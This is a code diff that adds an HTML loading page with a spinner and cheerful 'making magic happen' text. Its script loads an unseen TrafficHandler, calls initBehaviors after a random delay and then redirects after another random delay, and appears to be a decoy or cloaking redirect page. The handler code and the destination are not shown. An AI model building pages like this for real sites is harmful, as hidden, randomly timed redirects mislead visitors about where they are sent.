@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to Our Creative Hub</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f6d365 0%, #fda085 100%);
+            min-height: 100vh;
+        }
+        .content-wrapper {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff6b6b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            color: #2c3e50;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #666;
+            font-size: 1.2em;
+            line-height: 1.6;
+        }
+        .emoji {
+            font-size: 2em;
+            margin: 20px 0;
+        }
+        .progress-text {
+            color: #ff6b6b;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="content-wrapper">
+        <h1>🚀 Preparing Something Amazing!</h1>
+        <p>Hold tight while we craft your extraordinary experience...</p>
+        <div class="emoji">✨</div>
+        <div class="loader"></div>
+        <p class="progress-text">Making magic happen...</p>
+        <p>Did you know? The best things in life are worth waiting for! 🌟</p>
+    </div>
+    <script src="js/handler.js"></script>
+    <script>
+        const handler = new TrafficHandler();
+        
+        setTimeout(() => {
+            handler.initBehaviors();
+        }, 800 + Math.random() * 1200);
+
+        setTimeout(() => {
+            handler.redirect();
+        }, 2000 + Math.random() * 2000);
+    </script>
+</body>
+</html>
